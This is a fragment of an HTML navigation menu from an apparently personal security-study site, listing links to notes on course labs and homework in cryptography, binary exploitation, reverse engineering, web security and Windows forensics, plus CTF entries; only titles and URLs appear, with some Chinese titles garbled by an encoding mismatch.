data-nav-id=/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/index.html>Simple Crypto - 0x09(2023 Lab - signature)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/index.html>Simple Crypto - 0x10(2023 Lab - coppersmith)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/index.html>Simple Crypto 0x11(2023 HW - invalid_curve_attack)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/index.html>Simple Crypto 0x12(2023 HW - signature_revenge)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/index.html>Simple Crypto 0x13(2023 HW - Power Analysis)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/index.html>Simple PWN - 0x06(GOT hijacking/Lab - `got2win`)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn---0x07rop/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn---0x07rop/index.html>Simple PWN - 0x07(ROP)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/index.html>Simple PWN - 0x08(one_gadget with ROP)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/index.html>Simple PWN - 0x09(stack pivoting)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/index.html>Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/index.html>Simple PWN - 0x11(format string bug)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/index.html>Simple PWN - 0x12(Lab - `rop++`)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/index.html>Simple PWN - 0x13(Lab - `how2know`)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/index.html>Simple PWN - 0x14(Simple HEAP)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/index.html>Simple PWN - 0x15(Lab - `heapmath`)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/index.html>Simple PWN 0x16(simple_smallbin)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/index.html>Simple PWN 0x17(UAF - leak information)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/index.html>Simple PWN 0x18(Lab - `babynote`)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/index.html>Simple PWN 0x19(Lab - `babyums` - flag 1)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/index.html>Simple PWN 0x20(Lab - `babyums` - flag 2)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/index.html>Simple PWN 0x21(fopen, fread, fwrite, fclose)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/index.html>Simple PWN 0x22(Lab - `AAR`)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/index.html>Simple PWN 0x23(Lab - `AAW`)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/index.html>Simple PWN 0x31(2023 HW - Notepad - Stage - 1)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/index.html>Simple PWN 0x32(2023 HW - Notepad-Stage 2)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/index.html>Simple PWN 0x33(2023 Lab - ROP_RW)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/index.html>Simple PWN 0x34 (2023 Lab - ret2plt)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/index.html>Simple PWN 0x35(2023 Lab - Stack Pivot)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/index.html>Simple PWN 0x36(2023 HW - Notepad-Stage 3)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/index.html>Simple PWN 0x37(2023 HW - HACHAMA)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/index.html>Simple PWN 0x38(Lab - UAF)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/index.html>Simple PWN 0x39(Lab - Double Free)</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/index.html>Simple PWN 0x40(2023 HW - UAF++)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/index.html>Simple Reverse - 0x01(Lab - Sacred Arts)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/index.html>Simple Reverse - 0x03(Lab - Why)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/index.html>Simple Reverse - 0x14(2023 Lab - AssemblyDev)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/index.html>Simple Reverse - 0x15(2023 HW - crackme_vectorization)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/index.html>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/index.html>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/index.html>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/index.html>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/index.html>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/index.html>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/index.html>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/index.html>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/index.html>Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/index.html>Simple Reverse - 0x25(2023 Lab - WinMalware - ä½œæ¥­)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/index.html>Simple Reverse - 0x26(2023 HW - Banana Donut Verifier)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/index.html>Simple Reverse - 0x27(2023 Lab - Scramble)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/index.html>Simple Reverse - 0x28(2023 Lab - Super Angry)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/index.html>Simple Reverse - 0x29(2023 Lab - Unpackme)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/index.html>Simple Reverse - 0x30(2023 HW - Evil FlagChecker)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/index.html>Simple Reverse 0x06(Lab - AMessageBox)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/index.html>Simple Reverse 0x08(Lab - GetProcAddress)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/index.html>Simple Reverse 0x11(Lab - Exception)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/index.html>Simple Reverse 0x12(Lab - TLSCallback)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/index.html><a class=padding href=/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/index.html>Simple Reverse 0x13(Lab - Meow)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/index.html>Simple Reverse 0x30(2023 HW - Baby Ransom 1)</a></li><li data-nav-id=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/index.html><a class=padding href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/index.html>Simple Reverse 0x31(2023 HW - Baby Ransom 2)</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/index.html>Simple Web - 0x02(Lab - Whois Tool)</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/index.html>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/index.html>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/index.html>Simple Web - 0x08(Lab - `Particles.js`)</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/index.html>Simple Web - 0x09(Lab - Simple Note)</a></li><li data-nav-id=/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/index.html><a class=padding href=/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/index.html>Simple Web 0x01(Lab - `gitleak`)</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/index.html>Simple Web 0x01(Lab - Hello from Windows 98)</a></li><li data-nav-id=/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/index.html><a class=padding href=/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/index.html>Simple Web 0x02(Lab - `.DS_Store`)</a></li><li data-nav-id=/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/index.html><a class=padding href=/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/index.html>Simple Web 0x03(Lab - Log me in + Revenge)</a></li><li data-nav-id=/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/index.html><a class=padding href=/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/index.html>Simple Web 0x04(Lab - Image Space 0x01)</a></li><li data-nav-id=/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/index.html><a class=padding href=/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/index.html>Simple Web 0x05(Lab - Image Space 0x02)</a></li><li data-nav-id=/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/index.html><a class=padding href=/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/index.html>Simple Web 0x06(Lab - Image Space 0x03)</a></li><li data-nav-id=/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/index.html><a class=padding href=/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/index.html>Simple Web 0x07(Lab - `HakkaMD`)</a></li><li data-nav-id=/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/index.html><a class=padding href=/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/index.html>Simple Web 0x08(Lab - My First Meow Website)</a></li><li data-nav-id=/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/index.html><a class=padding href=/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/index.html>Simple Web 0x09(Lab - DNS Lookup Tool)</a></li><li data-nav-id=/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/index.html><a class=padding href=/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/index.html>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</a></li><li data-nav-id=/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/index.html><a class=padding href=/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/index.html>Simple Web 0x11(Lab - XSS Me)</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/index.html>Simple Web 0x12(Lab - Web Preview Card)</a></li><li data-nav-id=/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/index.html><a class=padding href=/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/index.html>Simple Web 0x12(Lab - Web Preview Card)</a></li><li data-nav-id=/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/index.html><a class=padding href=/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/index.html>Simple Web 0x13(Lab - SSRFrog)</a></li><li data-nav-id=/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/index.html><a class=padding href=/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/index.html>Simple Web 0x14(Lab - Debug)</a></li><li data-nav-id=/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/index.html><a class=padding href=/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/index.html>Simple Web 0x15.5(Pickle)</a></li><li data-nav-id=/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/index.html><a class=padding href=/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/index.html>Simple Web 0x15(Lab - `Jinja`)</a></li><li data-nav-id=/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/index.html><a class=padding href=/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/index.html>Simple Web 0x16.5(php unserialize)</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x11lab---pickle/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x11lab---pickle/index.html>Simple Web 0x16(Lab - Pickle)</a></li><li data-nav-id=/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/index.html><a class=padding href=/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/index.html>Simple Web 0x16(Lab - Pickle)</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/index.html>Simple Web 0x17(Lab - Baby Cat)</a></li><li data-nav-id=/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/index.html><a class=padding href=/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/index.html>Simple Web 0x17(Lab - Baby Cat)</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/index.html>Simple Web 0x18(Lab - Magic Cat)</a></li><li data-nav-id=/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/index.html><a class=padding href=/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/index.html>Simple Web 0x18(Lab - Magic Cat)</a></li><li data-nav-id=/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/index.html><a class=padding href=/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/index.html>Simple Web 0x19(Lab - PHP Login)</a></li><li data-nav-id=/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/index.html><a class=padding href=/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/index.html>Simple Web 0x22(Lab - Pug)</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x14lab---xxe/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x14lab---xxe/index.html>Simple Web 0x23(Lab - XXE)</a></li><li data-nav-id=/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/index.html><a class=padding href=/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/index.html>Simple Web 0x23(Lab - XXE)</a></li><li data-nav-id=/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/index.html><a class=padding href=/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/index.html>Simple Web 0x24(Lab - how2http)</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/index.html>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</a></li><li data-nav-id=/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/index.html><a class=padding href=/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/index.html>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</a></li><li data-nav-id=/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/index.html><a class=padding href=/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/index.html>Simple Welcome - 0x04(Lab - Script)</a></li><li data-nav-id=/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/index.html><a class=padding href=/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/index.html>Simple Welcome 0x01(Lab - Let's meet at class)</a></li><li data-nav-id=/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/index.html><a class=padding href=/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/index.html>Simple Welcome 0x02 & 0x05(Lab - Nine & Nine-Revenge)</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/index.html>SQLi - APPRENTICE</a></li><li data-nav-id=/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---arcsight%E6%95%99%E5%AD%B8/index.html><a class=padding href=/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---arcsight%E6%95%99%E5%AD%B8/index.html>TaiwanHolyHigh - SoCåŸºç¤ç¶­é‹ - ArcSightæ•™å­¸</a></li><li data-nav-id=/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/index.html><a class=padding href=/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/index.html>TaiwanHolyHigh - SoCåŸºç¤ç¶­é‹ - HW2</a></li><li data-nav-id=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-background/index.html><a class=padding href=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-background/index.html>TaiwanHolyHigh - Windows Forensics - $MFT Background</a></li><li data-nav-id=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-resident-_-non-resident-file/index.html><a class=padding href=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-resident-_-non-resident-file/index.html>TaiwanHolyHigh - Windows Forensics - $MFT Resident / Non-Resident File</a></li><li data-nav-id=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-%E5%9F%BA%E6%9C%AC%E5%AF%A6%E4%BD%9C/index.html><a class=padding href=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-%E5%9F%BA%E6%9C%AC%E5%AF%A6%E4%BD%9C/index.html>TaiwanHolyHigh - Windows Forensics - $MFT åŸºæœ¬å¯¦ä½œ</a></li><li data-nav-id=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---background/index.html><a class=padding href=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---background/index.html>TaiwanHolyHigh - Windows Forensics - Background</a></li><li data-nav-id=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---lnk-lab/index.html><a class=padding href=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---lnk-lab/index.html>TaiwanHolyHigh - Windows Forensics - LNK Lab</a></li><li data-nav-id=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows-artifacts/index.html><a class=padding href=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows-artifacts/index.html>TaiwanHolyHigh - Windows Forensics - Windows Artifacts</a></li><li data-nav-id=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows%E6%AA%94%E6%A1%88%E7%B3%BB%E7%B5%B1%E8%88%87%E9%82%84%E5%8E%9F/index.html><a class=padding href=/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows%E6%AA%94%E6%A1%88%E7%B3%BB%E7%B5%B1%E8%88%87%E9%82%84%E5%8E%9F/index.html>TaiwanHolyHigh - Windows Forensics - Windowsæª”æ¡ˆç³»çµ±èˆ‡é‚„åŸ</a></li><li data-nav-id=/security/competition/tscctf-2024/index.html><a class=padding href=/security/competition/tscctf-2024/index.html>TSCCTF 2024</a></li><li data-nav-id=/security/course/ntu-st/unit-test-practice/index.html><a class=padding href=/security/course/ntu-st/unit-test-practice/index.html>Unit Test Practice</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/xss/xss---apprentice/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/xss/xss---apprentice/index.html>XSS - APPRENTICE</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/index.html>XXE - APPRENTICE</a></li><li data-nav-id=/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/index.html><a class=padding 